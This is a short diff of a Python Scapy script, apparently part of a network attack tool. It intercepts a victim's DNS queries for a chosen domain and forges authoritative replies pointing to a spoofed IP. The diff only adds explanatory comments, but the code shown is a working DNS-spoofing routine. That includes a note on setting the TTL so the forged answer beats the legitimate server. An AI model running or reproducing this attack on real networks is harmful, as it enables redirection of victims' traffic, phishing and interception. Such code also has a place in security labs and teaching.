@@ -25,7 +25,7 @@ def run(args):
     def dns_spoof_packet(packet):
         if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and packet.getlayer(IP).src == victim_ip:
             # Packet is a DNS request
-            dns_req = packet.getlayer(DNS).qd.qname
+            dns_req = packet.getlayer(DNS).qd.qname # Get the requested domain
             
             if domain in dns_req:
                 print( "[|] Intercepted DNS request for {}".format(dns_req))
@@ -36,9 +36,9 @@ def run(args):
                     IP(src=packet[IP].dst, dst=packet[IP].src) /
                     UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
                     DNS(
-                        id=packet[DNS].id,
-                        qr=1,  
-                        aa=1,
+                        id=packet[DNS].id, # Denote this reponse belongs to the original request
+                        qr=1,  # Denote this is a response
+                        aa=1, # Denote we are authoritative
                         qd=packet[DNS].qd,
                         # Does not work when ttl = 0, since no chaching is done and legit DNS server's response will win
                         an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoof_ip)
